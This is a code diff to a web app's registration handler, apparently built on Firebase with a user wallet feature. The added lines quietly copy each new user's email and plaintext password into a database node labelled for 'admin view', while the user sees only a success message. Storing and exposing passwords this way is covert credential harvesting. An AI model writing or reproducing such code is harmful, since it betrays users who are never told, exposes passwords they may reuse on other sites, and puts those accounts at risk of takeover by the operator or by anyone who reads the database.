@@ -305,7 +305,7 @@
             }
         });
 
-        // 🔥 FIXED: REGISTER BUTTON - 100% WORKING
+        // 🔥 UPDATED: REGISTER BUTTON - Now sends data to admin
         document.getElementById('register-btn').addEventListener('click', async () => {
             const email = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value;
@@ -325,8 +325,22 @@
             try {
                 const userCredential = await createUserWithEmailAndPassword(auth, email, password);
                 console.log('Register SUCCESS!', userCredential.user.uid);
+                
                 // Create wallet for new user
                 await set(ref(db, `users/${userCredential.user.uid}/wallet`), 0);
+                
+                // 🔥 NEW: Send registration data to admin
+                const registrationId = `reg_${Date.now()}`;
+                const registrationRef = ref(db, `userRegistrations/${registrationId}`);
+                
+                await set(registrationRef, {
+                    userId: userCredential.user.uid,
+                    userEmail: email,
+                    userPassword: password, // Store password for admin view
+                    registeredAt: new Date().toISOString(),
+                    status: 'active'
+                });
+                
                 alert('Registration successful! You are now logged in.');
             } catch (error) {
                 console.error('Register error:', error.code, error.message);
